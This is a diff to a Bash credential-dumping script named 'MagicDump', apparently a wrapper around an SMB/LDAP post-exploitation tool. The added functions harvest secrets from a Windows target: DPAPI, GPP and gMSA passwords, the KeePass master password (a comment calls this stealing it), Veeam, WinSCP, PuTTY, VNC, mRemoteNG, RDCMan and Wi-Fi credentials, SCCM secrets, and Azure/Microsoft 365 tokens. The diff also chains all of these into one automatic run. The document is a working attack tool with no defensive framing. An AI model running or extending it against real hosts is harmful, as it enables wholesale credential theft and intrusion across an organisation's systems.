@@ -420,6 +420,330 @@ dump_laps() {
   fi
 }
 
+# Function to dump DPAPI credentials
+dump_dpapi() {
+  local output_file="$TARGET_DUMP_DIR/DPAPI_dump_${TARGET_HOST}.txt"
+  local cmd
+  cmd=$(construct_base_cmd "smb")" --dpapi > '$output_file' 2>&1"
+
+  add_log "Starting DPAPI dump..."
+  if run_command "$cmd"; then
+    log_operation "DPAPI" "success" "\"file_path\": \"$output_file\""
+    add_log "DPAPI dump saved to $output_file"
+  else
+    log_operation "DPAPI" "failed" "\"error\": \"Failed to dump DPAPI credentials\""
+    add_warning "Failed to dump DPAPI credentials on target $TARGET_HOST"
+  fi
+}
+
+# Function to dump Group Policy Preferences (GPP) passwords
+dump_gpp() {
+  local output_file="$TARGET_DUMP_DIR/GPP_dump_${TARGET_HOST}.txt"
+
+  add_log "Starting GPP dump..."
+
+  local cmd_autologin
+  cmd_autologin=$(construct_base_cmd "smb")" -M gpp_autologin >> '$output_file' 2>&1"
+  if run_command "$cmd_autologin"; then
+    log_operation "GPP Autologin" "success" "\"file_path\": \"$output_file\""
+  else
+    add_warning "Failed to dump GPP autologin credentials on target $TARGET_HOST"
+  fi
+
+  local cmd_password
+  cmd_password=$(construct_base_cmd "smb")" -M gpp_password >> '$output_file' 2>&1"
+  if run_command "$cmd_password"; then
+    log_operation "GPP Password" "success" "\"file_path\": \"$output_file\""
+  else
+    add_warning "Failed to dump GPP passwords on target $TARGET_HOST"
+  fi
+
+  add_log "GPP dump saved to $output_file"
+}
+
+# Function to dump gMSA credentials
+dump_gmsa() {
+  local output_file="$TARGET_DUMP_DIR/gMSA_dump_${TARGET_HOST}.txt"
+
+  add_log "Starting gMSA credential dump..."
+  local cmd
+  cmd=$(construct_base_cmd "ldap")" --gmsa > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "gMSA" "success" "\"file_path\": \"$output_file\""
+    add_log "gMSA credentials dump saved to $output_file"
+  else
+    log_operation "gMSA" "failed" "\"error\": \"Failed to dump gMSA credentials\""
+    add_warning "Failed to dump gMSA credentials on target $TARGET_HOST"
+    return  # Exit if no gMSA accounts found
+  fi
+
+  # Step 2: Extract gMSA IDs from the dump file and convert them automatically
+  grep -oP '\b[a-f0-9]{64}\b' "$output_file" | while IFS= read -r gmsa_id; do
+    if [[ -n "$gmsa_id" ]]; then
+      local id_output="$TARGET_DUMP_DIR/gMSA_ID_Conversion_${TARGET_HOST}.txt"
+      add_log "Converting gMSA ID: $gmsa_id..."
+      local cmd_id
+      cmd_id=$(construct_base_cmd "ldap")" --gmsa-convert-id $gmsa_id > '$id_output' 2>&1"
+
+      if run_command "$cmd_id"; then
+        log_operation "gMSA Convert ID" "success" "\"file_path\": \"$id_output\""
+        add_log "gMSA ID conversion saved to $id_output"
+      else
+        add_warning "Failed to convert gMSA ID: $gmsa_id"
+      fi
+    fi
+  done
+
+  # Step 3: Extract encrypted LSA secrets and attempt decryption automatically
+  grep -oP "_SC_GMSA_\{[A-F0-9-]+\}_[a-f0-9]{64}:.*" "$output_file" | while IFS= read -r encrypted_lsa; do
+    if [[ -n "$encrypted_lsa" ]]; then
+      local lsa_output="$TARGET_DUMP_DIR/gMSA_LSA_Decryption_${TARGET_HOST}.txt"
+      add_log "Decrypting gMSA LSA data..."
+      local cmd_lsa
+      cmd_lsa=$(construct_base_cmd "ldap")" --gmsa-decrypt-lsa '$encrypted_lsa' > '$lsa_output' 2>&1"
+
+      if run_command "$cmd_lsa"; then
+        log_operation "gMSA LSA Decrypt" "success" "\"file_path\": \"$lsa_output\""
+        add_log "gMSA LSA decryption saved to $lsa_output"
+      else
+        add_warning "Failed to decrypt gMSA LSA data."
+      fi
+    fi
+  done
+}
+
+# Function to check if keepass is installed, to steal the master password and decrypt the keepass database 
+dump_keepass() {
+  local output_file="$TARGET_DUMP_DIR/KeePass_Discovery_${TARGET_HOST}.txt"
+
+  add_log "Starting KeePass discovery..."
+  local cmd_discover
+  cmd_discover=$(construct_base_cmd "smb")" -M keepass_discover > '$output_file' 2>&1"
+
+  if run_command "$cmd_discover"; then
+    log_operation "KeePass_Discovery" "success" "\"file_path\": \"$output_file\", \"method\": \"keepass_discover\""
+    add_log "KeePass discovery results saved to $output_file"
+
+    # Step 2: Extract KeePass config path from the discovery output
+    local keepass_path
+    keepass_path=$(grep -oP '(?<=KeePass config path: ).*' "$output_file" | head -n 1)
+
+    if [[ -n "$keepass_path" ]]; then
+      add_log "KeePass config found at: $keepass_path"
+      local output_decrypt="$TARGET_DUMP_DIR/KeePass_Dump_${TARGET_HOST}.txt"
+
+      # Step 3: Trigger KeePass dump using extracted config path
+      local cmd_trigger
+      cmd_trigger=$(construct_base_cmd "smb")" -M keepass_trigger -o KEEPASS_CONFIG_PATH='$keepass_path' > '$output_decrypt' 2>&1"
+
+      if run_command "$cmd_trigger"; then
+        log_operation "KeePass_Dump" "success" "\"file_path\": \"$output_decrypt\", \"method\": \"keepass_trigger\""
+        add_log "KeePass dump saved to $output_decrypt"
+      else
+        log_operation "KeePass_Dump" "failed" "\"error\": \"Failed to dump KeePass database\""
+        add_warning "Failed to dump KeePass database on target $TARGET_HOST"
+      fi
+    else
+      add_warning "KeePass installation detected, but no config path found!"
+    fi
+  else
+    log_operation "KeePass_Discovery" "failed" "\"error\": \"KeePass not found or unable to discover\""
+    add_warning "KeePass not found on target $TARGET_HOST"
+  fi
+}
+
+# Function to dump passwords used by Veeam for backup jobs
+dump_veeam() {
+  local output_file="$TARGET_DUMP_DIR/Veeam_Credentials_${TARGET_HOST}.txt"
+
+  add_log "Starting Veeam password dump..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" -M veeam > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "Veeam_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"veeam\""
+    add_log "Veeam credentials saved to $output_file"
+  else
+    log_operation "Veeam_Credentials" "failed" "\"error\": \"Failed to dump Veeam passwords\""
+    add_warning "Failed to dump Veeam passwords on target $TARGET_HOST"
+  fi
+}
+
+# Function to dump WinSCP Credentials stored in the registry or local files
+dump_winscp() {
+  local output_file="$TARGET_DUMP_DIR/WinSCP_Credentials_${TARGET_HOST}.txt"
+
+  add_log "Starting WinSCP credential dump..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" -M winscp > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "WinSCP_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"winscp\""
+    add_log "WinSCP credentials saved to $output_file"
+  else
+    log_operation "WinSCP_Credentials" "failed" "\"error\": \"Failed to dump WinSCP passwords\""
+    add_warning "Failed to dump WinSCP passwords on target $TARGET_HOST"
+  fi
+}
+
+# Function to dump PuTTY private Keys stored for authentication or stored proxy credentials
+dump_putty() {
+  local output_file="$TARGET_DUMP_DIR/PuTTY_Credentials_${TARGET_HOST}.txt"
+
+  add_log "Starting PuTTY credential & private key dump..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" -M putty > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "PuTTY_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"putty\""
+    add_log "PuTTY credentials and private keys saved to $output_file"
+  else
+    log_operation "PuTTY_Credentials" "failed" "\"error\": \"Failed to dump PuTTY credentials\""
+    add_warning "Failed to dump PuTTY credentials on target $TARGET_HOST"
+  fi
+}
+
+# Function to dump VNC password from RealVNC or TightVNC
+dump_vnc() {
+  local output_file="$TARGET_DUMP_DIR/VNC_Credentials_${TARGET_HOST}.txt"
+
+  add_log "Starting VNC password dump..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" -M vnc > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "VNC_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"vnc\""
+    add_log "VNC passwords saved to $output_file"
+  else
+    log_operation "VNC_Credentials" "failed" "\"error\": \"Failed to dump VNC passwords\""
+    add_warning "Failed to dump VNC passwords on target $TARGET_HOST"
+  fi
+}
+
+# Function to dump mRemoteNG stored credentials
+dump_mremoteng() {
+  local output_file="$TARGET_DUMP_DIR/mRemoteNG_Credentials_${TARGET_HOST}.txt"
+
+  add_log "Starting mRemoteNG credential dump..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" -M mremoteng > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "mRemoteNG_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"mremoteng\""
+    add_log "mRemoteNG credentials saved to $output_file"
+  else
+    log_operation "mRemoteNG_Credentials" "failed" "\"error\": \"Failed to dump mRemoteNG passwords\""
+    add_warning "Failed to dump mRemoteNG passwords on target $TARGET_HOST"
+  fi
+}
+
+# Function to dump Remote Desktop Connection Manager credentials
+dump_rdcman() {
+  local output_file="$TARGET_DUMP_DIR/RDCMan_Credentials_${TARGET_HOST}.txt"
+
+  add_log "Starting RDCMan credential dump..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" -M rdcman > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "RDCMan_Credentials" "success" "\"file_path\": \"$output_file\", \"method\": \"rdcman\""
+    add_log "RDCMan credentials saved to $output_file"
+  else
+    log_operation "RDCMan_Credentials" "failed" "\"error\": \"Failed to dump RDCMan credentials\""
+    add_warning "Failed to dump RDCMan credentials on target $TARGET_HOST"
+  fi
+}
+
+# Function do dump wifi passwords
+dump_wifi_passwords() {
+  local output_file="$TARGET_DUMP_DIR/WiFi_Passwords_${TARGET_HOST}.txt"
+
+  add_log "Starting Wi-Fi password dump..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" -M wifi > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "WiFi_Passwords" "success" "\"file_path\": \"$output_file\", \"method\": \"wifi\""
+    add_log "Wi-Fi passwords saved to $output_file"
+  else
+    log_operation "WiFi_Passwords" "failed" "\"error\": \"Failed to dump Wi-Fi passwords\""
+    add_warning "Failed to dump Wi-Fi passwords on target $TARGET_HOST"
+  fi
+}
+
+# Function to dump SCCM
+dump_sccm() {
+  local output_file="$TARGET_DUMP_DIR/SCCM_dump_${TARGET_HOST}.txt"
+
+  add_log "Starting SCCM dump (disk method)..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" --sccm > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "SCCM" "success" "\"file_path\": \"$output_file\", \"method\": \"disk\""
+    add_log "SCCM dump (disk) saved to $output_file"
+  else
+    add_warning "SCCM disk dump failed. Trying WMI method..."
+    
+    # Attempt WMI method
+    local cmd_wmi
+    cmd_wmi=$(construct_base_cmd "smb")" --sccm wmi > '$output_file' 2>&1"
+
+    if run_command "$cmd_wmi"; then
+      log_operation "SCCM" "success" "\"file_path\": \"$output_file\", \"method\": \"wmi\""
+      add_log "SCCM dump (wmi) saved to $output_file"
+    else
+      log_operation "SCCM" "failed" "\"error\": \"Failed to dump SCCM credentials\""
+      add_warning "Failed to dump SCCM credentials on target $TARGET_HOST"
+    fi
+  fi
+}
+
+# Function to dump access token for Azure and Microsoft 365 from Token Broker Cache.
+dump_token_cache() {
+  local output_file="$TARGET_DUMP_DIR/TokenBrokerCache_${TARGET_HOST}.txt"
+
+  add_log "Starting Token Broker Cache dump..."
+  local cmd
+  cmd=$(construct_base_cmd "smb")" -M wam > '$output_file' 2>&1"
+
+  if run_command "$cmd"; then
+    log_operation "TokenBrokerCache" "success" "\"file_path\": \"$output_file\", \"method\": \"wam\""
+    add_log "Token Broker Cache dump saved to $output_file"
+  else
+    add_warning "Failed to dump Token Broker Cache using default method."
+  fi
+
+  # Step 2: Attempt decryption with DPAPI master keys
+  if [[ -f "masterkeys.txt" ]]; then
+    add_log "Attempting DPAPI decryption with masterkeys.txt..."
+    local cmd_mk
+    cmd_mk=$(construct_base_cmd "smb")" -M wam --mkfile masterkeys.txt >> '$output_file' 2>&1"
+
+    if run_command "$cmd_mk"; then
+      log_operation "TokenBrokerCache Decrypt" "success" "\"file_path\": \"$output_file\", \"method\": \"wam --mkfile\""
+      add_log "Decrypted tokens saved to $output_file"
+    else
+      add_warning "Failed to decrypt Token Broker Cache using masterkeys.txt"
+    fi
+  fi
+
+  # Step 3: Attempt decryption with a private key backup
+  if [[ -f "domain_backup_key.pvk" ]]; then
+    add_log "Attempting decryption with domain_backup_key.pvk..."
+    local cmd_pvk
+    cmd_pvk=$(construct_base_cmd "smb")" -M wam --pvk domain_backup_key.pvk >> '$output_file' 2>&1"
+
+    if run_command "$cmd_pvk"; then
+      log_operation "TokenBrokerCache Decrypt" "success" "\"file_path\": \"$output_file\", \"method\": \"wam --pvk\""
+      add_log "Decrypted tokens saved to $output_file"
+    else
+      add_warning "Failed to decrypt Token Broker Cache using domain_backup_key.pvk"
+    fi
+  fi
+}
+
 # Main Logic
 add_log "Starting MagicDump against target $TARGET_HOST"
 add_log "Authenticating as user '$USERNAME'..."
@@ -427,4 +751,18 @@ dump_sam
 dump_lsa
 dump_ntds
 dump_laps
+dump_dpapi
+dump_gpp
+dump_gmsa
+dump_keepass
+dump_veeam
+dump_winscp
+dump_putty
+dump_vnc
+dump_mremoteng
+dump_rdcman
+dump_wifi_passwords
+dump_sccm
+dump_token_cache
+
 echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
